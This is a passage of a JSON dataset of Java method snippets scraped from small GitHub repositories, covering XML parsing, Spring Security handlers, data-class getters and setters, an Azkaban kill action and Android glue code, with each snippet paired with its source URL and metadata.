Properties attributes = new Properties();\n    NamedNodeMap attributeNodes = n.getAttributes();\n    if (attributeNodes != null) {\n      for (int i = 0; i < attributeNodes.getLength(); i++) {\n        Node attribute = attributeNodes.item(i);\n        String value = PropertyParser.parse(attribute.getNodeValue(), variables);\n        attributes.put(attribute.getNodeName(), value);\n      }\n    }\n    return attributes;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33928, "method_name": "parseBody", "class_name": "XNode", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String parseBody(Node node) {\n    String data = getBodyData(node);\n    if (data == null) {\n      NodeList children = node.getChildNodes();\n      for (int i = 0; i < children.getLength(); i++) {\n        Node child = children.item(i);\n        data = getBodyData(child);\n        if (data != null) {\n          break;\n        }\n      }\n    }\n    return data;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33929, "method_name": "getBodyData", "class_name": "XNode", "params": ["Node"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String getBodyData(Node child) {\n    if (child.getNodeType() == Node.CDATA_SECTION_NODE\n        || child.getNodeType() == Node.TEXT_NODE) {\n      String data = ((CharacterData) child).getData();\n      data = PropertyParser.parse(data, variables);\n      return data;\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/parsing/XNode.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33930, "method_name": "plant", "class_name": "Field", "params": ["Flower"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean plant(Flower flower) {\n        if (enoughSpace(flower.getPos())) {\n            flowers.add(flower);\n            System.out.println(\"planted\");\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Field.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33931, "method_name": "plantRandom", "class_name": "Field", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean plantRandom() {\n        Flower flower = Flower.generateRandom();\n        return plant(flower);\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Field.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33932, "method_name": "enoughSpace", "class_name": "Field", "params": ["Point2D"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean enoughSpace(Point2D pos) {\n        //the distance must be greater than the flower size\n        return flowers.stream().noneMatch((flower) -> (pos.distance(flower.getPos()) < Drawer2D.FLOWER_SIZE));\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Field.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33933, "method_name": "getFlowers", "class_name": "Field", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Flower>", "snippet": "    public ArrayList<Flower> getFlowers() {\n        return flowers;\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Field.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33934, "method_name": "getResultObject", "class_name": "DefaultResultContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public T getResultObject() {\n    return resultObject;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/result/DefaultResultContext.java", "stars": "15", "class_props": {"extends": null, "implements": ["ResultContext"], "modifiers": ["public"]}}, {"id": 33935, "method_name": "getResultCount", "class_name": "DefaultResultContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getResultCount() {\n    return resultCount;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/result/DefaultResultContext.java", "stars": "15", "class_props": {"extends": null, "implements": ["ResultContext"], "modifiers": ["public"]}}, {"id": 33936, "method_name": "isStopped", "class_name": "DefaultResultContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isStopped() {\n    return stopped;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/result/DefaultResultContext.java", "stars": "15", "class_props": {"extends": null, "implements": ["ResultContext"], "modifiers": ["public"]}}, {"id": 33937, "method_name": "nextResultObject", "class_name": "DefaultResultContext", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void nextResultObject(T resultObject) {\n    resultCount++;\n    this.resultObject = resultObject;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/result/DefaultResultContext.java", "stars": "15", "class_props": {"extends": null, "implements": ["ResultContext"], "modifiers": ["public"]}}, {"id": 33938, "method_name": "stop", "class_name": "DefaultResultContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void stop() {\n    this.stopped = true;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/result/DefaultResultContext.java", "stars": "15", "class_props": {"extends": null, "implements": ["ResultContext"], "modifiers": ["public"]}}, {"id": 33939, "method_name": "getCount", "class_name": "UrlArrayVO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return count;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33940, "method_name": "setCount", "class_name": "UrlArrayVO", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCount(int count) {\n        this.count = count;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33941, "method_name": "getList", "class_name": "UrlArrayVO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<T>", "snippet": "    public List<T> getList() {\n        return list;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33942, "method_name": "setList", "class_name": "UrlArrayVO", "params": ["List<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setList(List<T> list) {\n        this.list = list;\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33943, "method_name": "equals", "class_name": "UrlArrayVO", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (!(o instanceof UrlArrayVO)) return false;\n        UrlArrayVO<?> that = (UrlArrayVO<?>) o;\n        return getCount() == that.getCount() &&\n                Objects.equals(getList(), that.getList());\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33944, "method_name": "hashCode", "class_name": "UrlArrayVO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {\n        return Objects.hash(getCount(), getList());\n    }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlArrayVO.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33945, "method_name": "onFiled", "class_name": "BooleanValueChangeAspect", "params": ["JoinPoint", "Object", "Object"], "throws": ["IllegalAccessException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFiled(JoinPoint joinPoint, Object newValue, Object t) throws IllegalAccessException {\n        Object object = joinPoint.getThis();\n\n        FieldSignature fieldSignature = (FieldSignature) joinPoint.getSignature();\n        String fileName = fieldSignature.getName();\n        Field field = fieldSignature.getField();\n        field.setAccessible(true);\n        Class clazz = fieldSignature.getFieldType();\n        String clazzName = clazz.getSimpleName();\n\n        Object oldValue = field.get(t);\n\n        Log.i(\"MainActivity\", \"\\nonFiled value = \" + newValue.toString()\n                + \"\\n fieldSignature =\" + fieldSignature.toString()\n                + \"\\nfield = \" + field.toString()\n                + \" +  \\nFileName = \" + fileName\n                + \"\\nclazzName = \" + clazzName\n                + \" \\noldValue = \" + oldValue.toString() );\n    }", "url": "https://raw.githubusercontent.com/he303954106/AOP_Demo/master/app/src/main/java/com/netease/aop/login/aspect/BooleanValueChangeAspect.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33946, "method_name": "loadUserByUsername", "class_name": "AuthUserDetailsService", "params": ["String"], "throws": ["UsernameNotFoundException"], "modifiers": ["public"], "return_type": "UserDetails", "snippet": "\tpublic UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n\t\tUserEntity user = userRepository.findUserByUserName(username);\n\t\tif(user != null){\n\t\t\tList<GrantedAuthority> authorities = new ArrayList<GrantedAuthority>();\n\t\t\tauthorities.add(new SimpleGrantedAuthority(\"ROLE_ADMIN\"));\n\t\t\t\n\t\t\treturn new User(user.getUserName(), user.getPassword(), authorities);\n\t\t}\n\t\t\n\t\tthrow new UsernameNotFoundException(\"User '\" + username + \"' not found.\");\n\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-auth-service/src/main/java/com/iiht/stock/auth/security/AuthUserDetailsService.java", "stars": "2", "class_props": {"extends": null, "implements": ["UserDetailsService"], "modifiers": ["public"]}}, {"id": 33947, "method_name": "onAuthenticationSuccess", "class_name": "AjaxAuthenticationSuccessHandler", "params": ["HttpServletRequest", "HttpServletResponse", "Authentication"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAuthenticationSuccess(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Authentication authentication) throws IOException, ServletException {\n        httpServletResponse.setCharacterEncoding(\"UTF-8\");//\u8bbe\u7f6e\u670d\u52a1\u5668\u7684\u7f16\u7801\uff0c\u9ed8\u8ba4\u662fISO-8859-1\n        httpServletResponse.setContentType(\"application/json; charset = utf-8\");//\u544a\u8bc9\u6d4f\u89c8\u5668\u670d\u52a1\u5668\u7684\u7f16\u7801\u683c\u5f0f\n        httpServletResponse.getWriter().write(new Gson().toJson(ApiResponse.ofSuccess(authentication)));\n    }", "url": "https://raw.githubusercontent.com/harry-xqb/rent-house/master/src/main/java/com/harry/renthouse/security/ajax_login/AjaxAuthenticationSuccessHandler.java", "stars": "3", "class_props": {"extends": null, "implements": ["AuthenticationSuccessHandler"], "modifiers": ["public"]}}, {"id": 33948, "method_name": "change", "class_name": "Demo01Function", "params": ["String", "Function<String,Integer>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void change(String s, Function<String,Integer> fun){\n        //Integer in = fun.apply(s);\n        int in = fun.apply(s);//\u81ea\u52a8\u62c6\u7bb1 Integer->int\n        System.out.println(in);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo07/Function/Demo01Function.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33949, "method_name": "main", "class_name": "Demo01Function", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u6574\u6570\n        String s = \"1234\";\n        //\u8c03\u7528change\u65b9\u6cd5,\u4f20\u9012\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u6574\u6570,\u548cLambda\u8868\u8fbe\u5f0f\n        change(s,(String str)->{\n            //\u628a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u6574\u6570,\u8f6c\u6362\u4e3aInteger\u7c7b\u578b\u7684\u6574\u6570\u8fd4\u56de\n            return Integer.parseInt(str);\n        });\n        //\u4f18\u5316Lambda\n        change(s,str->Integer.parseInt(str));\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo07/Function/Demo01Function.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33950, "method_name": "getNome", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getNome() {\n        return nome;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33951, "method_name": "setNome", "class_name": "Fornecedor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNome(String nome) {\n        this.nome = nome;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33952, "method_name": "getRazaoSocial", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRazaoSocial() {\n        return razaoSocial;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33953, "method_name": "setRazaoSocial", "class_name": "Fornecedor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRazaoSocial(String razaoSocial) {\n        this.razaoSocial = razaoSocial;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33954, "method_name": "getEmail", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEmail() {\n        return email;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33955, "method_name": "setEmail", "class_name": "Fornecedor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEmail(String email) {\n        this.email = email;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33956, "method_name": "getEndereco", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEndereco() {\n        return endereco;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33957, "method_name": "setEndereco", "class_name": "Fornecedor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEndereco(String endereco) {\n        this.endereco = endereco;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33958, "method_name": "getCnpj", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCnpj() {\n        return cnpj;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33959, "method_name": "setCnpj", "class_name": "Fornecedor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCnpj(int cnpj) {\n        this.cnpj = cnpj;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33960, "method_name": "getTelefone", "class_name": "Fornecedor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTelefone() {\n        return telefone;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33961, "method_name": "setTelefone", "class_name": "Fornecedor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTelefone(int telefone) {\n        this.telefone = telefone;\n    }", "url": "https://raw.githubusercontent.com/samuelPed/trabalho-pupo/master/src/java/br/gov/sp/fatec/cadastro/Fornecedor.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33962, "method_name": "getId", "class_name": "ExecNodeQuery", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecNodeQuery.java", "stars": "23", "class_props": {"extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"id": 33963, "method_name": "setId", "class_name": "ExecNodeQuery", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecNodeQuery.java", "stars": "23", "class_props": {"extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"id": 33964, "method_name": "getAddress", "class_name": "ExecNodeQuery", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAddress() {\n        return address;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecNodeQuery.java", "stars": "23", "class_props": {"extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"id": 33965, "method_name": "setAddress", "class_name": "ExecNodeQuery", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAddress(String address) {\n        this.address = address;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/query/ExecNodeQuery.java", "stars": "23", "class_props": {"extends": "PageQuery", "implements": null, "modifiers": ["public"]}}, {"id": 33966, "method_name": "onDraw", "class_name": "Practice07MatrixTranslateView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        canvas.save();\n        matrix.reset();\n        matrix.postTranslate(-100, -100);\n        canvas.concat(matrix);\n        canvas.drawBitmap(bitmap, point1.x, point1.y, paint);\n        canvas.restore();\n\n        canvas.save();\n        matrix.reset();\n        matrix.postTranslate(200, 0);\n        canvas.concat(matrix);\n        canvas.drawBitmap(bitmap, point2.x, point2.y, paint);\n        canvas.restore();\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson4/Practice07MatrixTranslateView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 33967, "method_name": "createFromJson", "class_name": "KillExecutionAction", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "KillExecutionAction", "snippet": "  public static KillExecutionAction createFromJson(final Object obj) {\n    return createFromJson((HashMap<String, Object>) obj);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33968, "method_name": "createFromJson", "class_name": "KillExecutionAction", "params": ["HashMap<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "KillExecutionAction", "snippet": "  public static KillExecutionAction createFromJson(final HashMap<String, Object> obj) {\n    final Map<String, Object> jsonObj = (HashMap<String, Object>) obj;\n    final String objType = (String) jsonObj.get(\"type\");\n    if (!objType.equals(type)) {\n      throw new RuntimeException(\"Cannot create action of \" + type + \" from \"\n          + objType);\n    }\n    final String actionId = (String) jsonObj.get(\"actionId\");\n    final int execId = Integer.valueOf((String) jsonObj.get(\"execId\"));\n    return new KillExecutionAction(actionId, execId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33969, "method_name": "getId", "class_name": "KillExecutionAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return this.actionId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33970, "method_name": "getType", "class_name": "KillExecutionAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getType() {\n    return type;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33971, "method_name": "fromJson", "class_name": "KillExecutionAction", "params": ["Object"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "KillExecutionAction", "snippet": "  public KillExecutionAction fromJson(final Object obj) throws Exception {\n    return createFromJson((HashMap<String, Object>) obj);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33972, "method_name": "toJson", "class_name": "KillExecutionAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toJson() {\n    final Map<String, Object> jsonObj = new HashMap<>();\n    jsonObj.put(\"actionId\", this.actionId);\n    jsonObj.put(\"type\", type);\n    jsonObj.put(\"execId\", String.valueOf(this.execId));\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33973, "method_name": "doAction", "class_name": "KillExecutionAction", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void doAction() throws Exception {\n    logger.info(\"ready to kill execution \" + this.execId);\n    ServiceProvider.SERVICE_PROVIDER.getInstance(FlowRunnerManager.class)\n        .cancelFlow(this.execId, Constants.AZKABAN_SLA_CHECKER_USERNAME);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33974, "method_name": "setContext", "class_name": "KillExecutionAction", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setContext(final Map<String, Object> context) {\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33975, "method_name": "getDescription", "class_name": "KillExecutionAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDescription() {\n    return type + \" for \" + this.execId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillExecutionAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 33976, "method_name": "onInit", "class_name": "TextToSpeechImplementation", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onInit (int p0)\n\t{\n\t\tn_onInit (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33977, "method_name": "n_onInit", "class_name": "TextToSpeechImplementation", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onInit (int p0);\n\n\n\tpublic void onUtteranceCompleted (java.lang.String p0)\n\t{\n\t\tn_onUtteranceCompleted (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33978, "method_name": "onUtteranceCompleted", "class_name": "TextToSpeechImplementation", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onUtteranceCompleted (java.lang.String p0)\n\t{\n\t\tn_onUtteranceCompleted (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33979, "method_name": "n_onUtteranceCompleted", "class_name": "TextToSpeechImplementation", "params": ["java"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onUtteranceCompleted (java.lang.String p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33980, "method_name": "monodroidAddReference", "class_name": "TextToSpeechImplementation", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33981, "method_name": "monodroidClearReferences", "class_name": "TextToSpeechImplementation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/TextToSpeechImplementation.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android", "android"], "modifiers": ["public"]}}, {"id": 33982, "method_name": "handle", "class_name": "URLHandler", "params": ["String", "Request", "HttpServletRequest", "HttpServletResponse"], "throws": null, 